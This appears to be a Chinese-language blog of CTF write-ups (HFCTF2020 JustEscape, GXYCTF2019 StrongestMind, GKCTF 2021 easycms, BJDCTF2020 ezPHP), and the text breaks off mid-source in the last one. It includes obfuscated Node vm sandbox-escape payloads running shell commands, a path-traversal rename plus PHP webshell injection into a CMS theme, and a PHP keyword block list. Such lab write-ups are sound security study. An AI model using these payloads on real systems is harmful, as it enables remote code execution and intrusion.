 &lt;h2 id=&#34;hfctf2020justescape&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hfctf2020justescape&#34;&gt;#&lt;/a&gt; [HFCTF2020]JustEscape&lt;/h2&gt;
&lt;p&gt;题目说真的不是 PHP 吗？&lt;br&gt;
十有八九不是，猜测可能是 Java，结果是 js。&lt;/p&gt;
&lt;h4 id=&#34;用errorstack看一下报错信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用errorstack看一下报错信息&#34;&gt;#&lt;/a&gt; 用 &lt;code&gt;Error().stack&lt;/code&gt; , 看一下报错信息。&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错显示是 &lt;code&gt;vm.js&lt;/code&gt; ，考的 vm 沙箱逃逸。&lt;br&gt;
POC 参考：&lt;br&gt;
https://&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1naXRodWImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;github&lt;/span&gt;.com/patriksimek/vm2/issues/225&lt;br&gt;
payload1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(function ()&amp;#123;
    TypeError[`$&amp;#123;`$&amp;#123;`prototyp`&amp;#125;e`&amp;#125;`][`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`] = f=&amp;gt;f[`$&amp;#123;`$&amp;#123;`constructo`&amp;#125;r`&amp;#125;`](`$&amp;#123;`$&amp;#123;`return proc`&amp;#125;ess`&amp;#125;`)();
    try&amp;#123;
        Object.preventExtensions(Buffer.from(``)).a = 1;
    &amp;#125;catch(e)&amp;#123;
        return e[`$&amp;#123;`$&amp;#123;`get_pro`&amp;#125;cess`&amp;#125;`](()=&amp;gt;&amp;#123;&amp;#125;).mainModule[`$&amp;#123;`$&amp;#123;`requir`&amp;#125;e`&amp;#125;`](`$&amp;#123;`$&amp;#123;`child_proces`&amp;#125;s`&amp;#125;`)[`$&amp;#123;`$&amp;#123;`exe`&amp;#125;cSync`&amp;#125;`](`cat /flag`).toString();
    &amp;#125;
&amp;#125;)()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;payload2：（join 拼接字符串）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(()=&amp;gt;&amp;#123; TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`] = f=&amp;gt;f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,` `,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); try&amp;#123; Object[`preventExtensions`](Buffer[`from`](``))[`a`] = 1; &amp;#125;catch(e)&amp;#123; return e[`a`](()=&amp;gt;&amp;#123;&amp;#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat /flag`)[`toString`](); &amp;#125; &amp;#125;)()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BHFCTF2020%5DJustEscape/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;获得 flag&lt;/p&gt;

 &lt;h2 id=&#34;gxyctf2019strongestmind&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gxyctf2019strongestmind&#34;&gt;#&lt;/a&gt; [GXYCTF2019]StrongestMind&lt;/h2&gt;
&lt;p&gt;搞了个计算机，要算 1000 次正确就给 flag&lt;/p&gt;
&lt;p&gt;直接上脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
import re
import time

url = &#39;http://6f50dc2f-2732-4820-9115-f988593362dd.node5.buuoj.cn:81/&#39;
session = requests.session()
req = session.get(url).text
flag = &amp;quot;&amp;quot;

for i in range(1010):
    try:
        result = re.findall(&amp;quot;&amp;lt;br\&amp;gt;\&amp;lt;br\&amp;gt;(\d.*?)\&amp;lt;br\&amp;gt;\&amp;lt;br\&amp;gt;&amp;quot;, req)  # 获取[数字]
        result = &amp;quot;&amp;quot;.join(result)  # 提取字符串
        result = eval(result)  # 运算
        print(&amp;quot;time: &amp;quot; + str(i) + &amp;quot;   &amp;quot; + &amp;quot;result: &amp;quot; + str(result))

        data = &amp;#123;&amp;quot;answer&amp;quot;: result&amp;#125;
        req = session.post(url, data=data).text
        if &amp;quot;flag&amp;#123;&amp;quot; in req:
            print(re.search(&amp;quot;flag&amp;#123;.*&amp;#125;&amp;quot;, req).group(0)[:50])
            break
        time.sleep(0.1)  # 防止访问太快断开连接
    except:
        print(&amp;quot;[-]&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;没学过的爬虫方式（还能提取字符串）&lt;/p&gt;

 &lt;h2 id=&#34;gkctf-2021easycms&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gkctf-2021easycms&#34;&gt;#&lt;/a&gt; [GKCTF 2021]easycms&lt;/h2&gt;
&lt;p&gt;dirsearch 扫目录发现 admin.php 进入后台登录页面&lt;/p&gt;
&lt;p&gt;猜 admin 的 12345&lt;/p&gt;
&lt;p&gt;因为首页的提示显示密码是五位数&lt;/p&gt;
&lt;p&gt;这种 CMS，第一时间想到主题。&lt;/p&gt;
&lt;p&gt;试了下主题可以导出，主题这里想导入需要创建这个文件&lt;/p&gt;
&lt;p&gt;![1](…/images/NSS[GKCTF 2021]easycms/1.png)&lt;/p&gt;
&lt;p&gt;所以要创建一个文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;/var/www/html/system/tmp/qgak.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在设计 - 组件 - 素材库里可以上传文件然后重命名&lt;/p&gt;
&lt;p&gt;将名称换成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;../../../../../../../../../../../../var/www/html/system/tmp/qgak
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;他会自动加.txt&lt;/p&gt;
&lt;p&gt;直接在主题的高级里面加马（蚁剑连接）或者直接&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(&#39;cat /flag&#39;); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后就是主页展示：（这是在全局文件上改的）&lt;/p&gt;
&lt;p&gt;![2](…/images/NSS[GKCTF 2021]easycms/2.png)&lt;/p&gt;

 &lt;h2 id=&#34;bjdctf2020ezphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020ezphp&#34;&gt;#&lt;/a&gt; [BJDCTF2020]ezPHP&lt;/h2&gt;
&lt;p&gt;ctrl+u 获得提示源码地址：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GFXEIM3YFZYGQ4A=
base32解码后：
1nD3x.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;进入获得源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;error_reporting&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;1nD3x.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$shana&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;shana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$passwd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;passwd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$arg&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br /&gt;&amp;lt;font color=red&gt;&amp;lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&amp;lt;/B&gt;&amp;lt;br&gt;&amp;lt;/font&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;QUERY_STRING&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;